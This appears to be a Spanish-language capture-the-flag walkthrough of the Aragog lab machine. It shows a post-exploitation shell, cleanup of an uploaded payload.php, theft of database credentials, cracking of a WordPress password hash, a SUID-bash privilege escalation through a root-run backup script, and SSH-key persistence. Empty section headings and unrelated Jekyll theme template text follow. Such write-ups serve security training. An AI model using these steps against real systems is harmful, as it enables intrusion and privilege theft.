www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ export TERM=xterm
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ export SHELL=bash
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ stty size rows 45 columns 184
45 184
```
- Eliminamos el archivo `payload.php`
```console
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ shred -zun 10 -v payload.php
shred: payload.php: pass 1/11 (random)...
shred: payload.php: pass 2/11 (ffffff)...
shred: payload.php: pass 3/11 (555555)...
shred: payload.php: pass 4/11 (b6db6d)...
shred: payload.php: pass 5/11 (249249)...
shred: payload.php: pass 6/11 (random)...
shred: payload.php: pass 7/11 (924924)...
shred: payload.php: pass 8/11 (000000)...
shred: payload.php: pass 9/11 (aaaaaa)...
shred: payload.php: pass 10/11 (random)...
shred: payload.php: pass 11/11 (000000)...
shred: payload.php: removing
shred: payload.php: renamed to 00000000000
shred: 00000000000: renamed to 0000000000
shred: 0000000000: renamed to 000000000
shred: 000000000: renamed to 00000000
shred: 00000000: renamed to 0000000
shred: 0000000: renamed to 000000
shred: 000000: renamed to 00000
shred: 00000: renamed to 0000
shred: 0000: renamed to 000
shred: 000: renamed to 00
shred: 00: renamed to 0
shred: payload.php: removed
```
- Leer el primer `horocrux`
```console
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /home/hagrid98/horcrux1.txt
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
```
- Debido a que la aplicación web está desarrollada con Apache, procedemos a revisar la estructura de este.

```console
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /etc/apache2/sites-enabled/wordpress.conf
Alias /blog /usr/share/wordpress
<Directory /usr/share/wordpress>
    Options FollowSymLinks
    AllowOverride Limit Options FileInfo
    DirectoryIndex index.php
    Order allow,deny
    Allow from all
</Directory>
<Directory /usr/share/wordpress/wp-content>
    Options FollowSymLinks
    Order allow,deny
    Allow from all
</Directory>
```
- Revisar el archivo de configuración de WordPress.

```console
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /etc/apache2/sites-enabled/wordpress.conf
Alias /blog /usr/share/wordpress
<Directory /usr/share/wordpress>
    Options FollowSymLinks
    AllowOverride Limit Options FileInfo
    DirectoryIndex index.php
    Order allow,deny
    Allow from all
</Directory>
<Directory /usr/share/wordpress/wp-content>
    Options FollowSymLinks
    Order allow,deny
    Allow from all
</Directory>
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /usr/share/wordpress/wp-co
wp-comments-post.php  wp-config-sample.php  wp-config.php         wp-content/
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /usr/share/wordpress/wp-config.php
<?php
/***
 * WordPress's Debianised default master config file
 * Please do NOT edit and learn how the configuration works in
 * /usr/share/doc/wordpress/README.Debian
 ***/

/* Look up a host-specific config file in
 * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php
 */
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
$debian_server = preg_replace("/[^a-zA-Z0-9.\-]/", "", $debian_server);
$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';
/* Main site in case of multisite with subdomains */
$debian_main_server = preg_replace("/^[^.]*\./", "", $debian_server);
$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';

if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

/* Default value for some constants if they have not yet been set
   by the host-specific config files */
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP_CORE_UPDATE'))
    define('WP_CORE_UPDATE', false);
if (!defined('WP_ALLOW_MULTISITE'))
    define('WP_ALLOW_MULTISITE', true);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost');
if (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))
    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');

/* Default value for the table_prefix variable so that it doesn't need to
   be put in every host-specific config file */
if (!isset($table_prefix)) {
    $table_prefix = 'wp_';
}

if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
    $_SERVER['HTTPS'] = 'on';

require_once(ABSPATH . 'wp-settings.php');
?>
```
- Este archivo indica que se está consultando al fichero `/etc/wordpress/config-default.php`.
```console
www-data@Aragog:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /etc/wordpress/config-default.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
```
- Con las credenciales encontradas, enumerar la base de datos.

```console
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
```
- Crear un archivo y depositar el hash dentro para tratar de romperlo con fuerza bruta.
```console
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2024-07-02 19:39) 11.11g/s 17066p/s 17066c/s 17066C/s teacher..mexico1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
- Conectarse vía SSH como el usuario `hagrid98` y buscar archivos de los cuales, sea el propietario.
```console
hagrid98@Aragog:/$ find \-user hagrid98 2>/dev/null
./proc/2196/gid_map
./proc/2196/projid_map
./proc/2196/setgroups
./proc/2196/timers
./proc/2196/timerslack_ns
./proc/2196/patch_state
./opt/.backup.sh
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
./sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.procs
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.threads
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.events
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.descendants
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cpu.stat
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.type
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.stat
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.threads
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.controllers
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
./sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
```
- Dado que somos el propietario del archivo `./opt/.backup.sh` y que el usuario `root` es quien está ejecutando el script, podemos alterar el contenido del archivo.
```console
#!/bin/bash
cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
chmod u+s /bin/bash
```
- Elevar priviligios a través de una `bash`.
```console
hagrid98@Aragog:/$ bash -p
bash-5.0# whoami
root
```
- Crear persistencia creando un par de llaves y cargando la llave pública en el archivo `authorized_keys` del usuario `root` en la máquina Aragog.

## Máquina Nagini
## Máquina Fawkes
## Máquina Dumbledore
## Máquina Matrix
## Máquina Brainpan

> Once the position is specified, the image caption should not be added.
{: .prompt-warning }


> The benefit of reading the author information from the file `_data/authors.yml`{: .filepath } is that the page will have the meta tag `twitter:creator`, which enriches the [Twitter Cards](https://developer.twitter.com/en/docs/twitter-for-websites/cards/guides/getting-started#card-and-content-attribution) and is good for SEO.
{: .prompt-info }

> The posts' _layout_ has been set to `post` by default, so there is no need to add the variable _layout_ in the Front Matter block.
{: .prompt-tip }

> The Jekyll tag `{% highlight %}` is not compatible with this theme.
{: .prompt-danger }


| Video URL                                                                                          | Platform   | ID             |
| -------------------------------------------------------------------------------------------------- | ---------- | :------------- |
| [https://www.**youtube**.com/watch?v=**H-B46URT4mg**](https://www.youtube.com/watch?v=H-B46URT4mg) | `youtube`  | `H-B46URT4mg`  |
| [https://www.**twitch**.tv/videos/**1634779211**](https://www.twitch.tv/videos/1634779211)         | `twitch`   | `1634779211`   |
| [https://www.**bilibili**.com/video/**BV1Q44y1B7Wf**](https://www.bilibili.com/video/BV1Q44y1B7Wf) | `bilibili` | `BV1Q44y1B7Wf` |




```yaml
---
title: TITLE
date: YYYY-MM-DD HH:MM:SS +/-TTTT
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [TAG]     # TAG names should always be lowercase
---
```